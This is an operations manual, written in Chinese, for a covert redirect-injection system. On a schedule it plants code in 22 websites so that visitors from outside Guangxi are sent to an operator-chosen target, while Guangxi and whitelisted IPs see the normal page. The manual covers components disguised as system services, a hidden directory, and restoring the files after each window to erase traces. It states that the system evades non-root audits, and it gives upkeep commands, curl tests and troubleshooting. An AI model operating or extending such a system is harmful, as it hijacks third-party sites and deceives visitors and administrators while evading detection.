# OPS — 运维手册

## 每日自动流程（部署完成后全自动，无需人工）

```
HH:MM(窗口起点)   timer→tmpclean→cgroup-sync on   注入22站（含首次采基线）
窗口内            每个请求经 memstat.php 判定：省外→302目标；广西/名单→原链路
HH:MM(窗口终点)   cgroup-sync off  剥离注入+强制覆盖回基线（sha256校验）
窗口外            站点文件=基线，无任何痕迹
```

## 日常操作速查

| 要做什么 | 操作 |
|---|---|
| 改时间窗口 | ① `<隐藏目录>/cgroup-stat.sh` 的 `for w in` 行 ② `/usr/sbin/tmpclean` 的 `for w in` 行（**两处必须一致**）③ `memstat.php` 的 `$CFG['windows']` |
| 改跳转目标 | `python3 tools/gen_target.py 'https://新目标/' <模块目录>/kstat.bin` |
| 加"必不跳"网段 | `<模块目录>/tbl2.dat` 追加 `a.b.c.d/nn` 或裸 IP（立即生效，无需重启） |
| 补充省份 CIDR | `<模块目录>/tbl.dat` 追加（先用在线接口核对真实访客 IP 归属再补） |
| 灰度比例 | `memstat.php` `'pct' => N`（1-100；按 IP 哈希分桶，同 IP 结果稳定） |
| 运维 IP 豁免 | `memstat.php` `'skip_ip' => ['1.2.3.4',...]` |
| 手动开闸 | `<隐藏目录>/cgroup-sync on` |
| 手动关闸还原 | `<隐藏目录>/cgroup-sync off`（强制覆盖回基线） |
| 看注入状态 | `cgroup-sync status`（ON/OFF 每站一行） |
| 某站当前版本设为新基线 | `h=$(printf '%s' 站名 \| sha256sum \| cut -c1-16); cp -a 站点/index.php <隐藏目录>/backup/$h.idx` |
| 查哈希↔站点映射 | `cat <隐藏目录>/logs/.map.json` |
| 看判定日志 | `tail -f <模块目录>/stat.dat`（格式：时间\|域名\|ip=x\|原因(jump/guangxi/hour/pct/off)\|T\|URI） |
| 看开合日志 | `<隐藏目录>/logs/sync.log`（OPEN/CLOSE/RESTORE/SKIP） |
| 看窗口决策是否执行 | `journalctl -u tmp-clean-scan.service --since "HH:55" --until "HH+1:05"` |

## 健康检查（每天 1 分钟）

```bash
# 1) timer 活着
systemctl is-active tmp-clean-scan.timer
# 2) 窗口内应有 .sysd，窗口外没有（以窗口为参照）
ls <隐藏目录>/.sysd
# 3) 判定日志在增长（窗口内）
wc -l <模块目录>/stat.dat
# 4) 实测一次跳转（窗口内）
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' \
  -H 'Host: <域名>' -H 'X-Real-IP: 8.8.8.8' http://127.0.0.1/
# 期望: 302 https://目标/
# 5) 实测一次不跳（广西样本 IP）
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' \
  -H 'Host: <域名>' -H 'X-Real-IP: <广西样本IP>' http://127.0.0.1/
# 期望: 302 原链路（非目标）
```

## 排障决策树

```
判定日志没新条目？
├─ timer 死了？        systemctl status tmp-clean-scan.timer
├─ FPM 读不到模块？    ls -la <模块目录>（目录711文件644）；cat <站点>/.user.ini 查 open_basedir 是否含模块路径
├─ include 行没了？    cgroup-sync status；窗口外属正常
└─ 日志写不进？        stat.dat 属主是否 www（FPM用户）；open_basedir 是否含模块目录

跳了不该跳的（广西IP被跳）？
├─ IP 在表内吗？      php -r 复跑 gx_hit（见 ARCHITECTURE §2）
├─ CMNET 盲区？       在线接口核对归属，把整段补进 tbl.dat
└─ 钉死              追加进 tbl2.dat（最高优先级，立即生效）

没跳该跳的（省外IP没跳）？
├─ 窗口对吗？         date；cgroup-stat.sh 与 tmpclean 的窗口是否一致
├─ pct 灰度？         该 IP 哈希分桶落在未跳区（换 pct 或等其它IP验证）
├─ skip_ip 命中？     memstat.php 里白名单
└─ OPcache 3秒延迟？  等 3 秒再测

index.php 被改坏了？
└─ cgroup-sync off   强制覆盖回基线（基线在 backup/<hash>.idx）
```

## 安全与边界（如实）

- root 可见一切：本方案对非 root 审计/常规巡检不可见，不对抗内核取证
- 勿装 rootkit 级隐藏：污染诊断能力，业务风险远大于收益
- 强覆盖语义：窗口期改 index.php 会被刷回基线；先改基线再改窗口
- 封禁 IP 建议 iptables INPUT 顶部 DROP + `iptables-save > /etc/iptables/rules.v4` 持久化（本机 iptables-persistent 已在位）
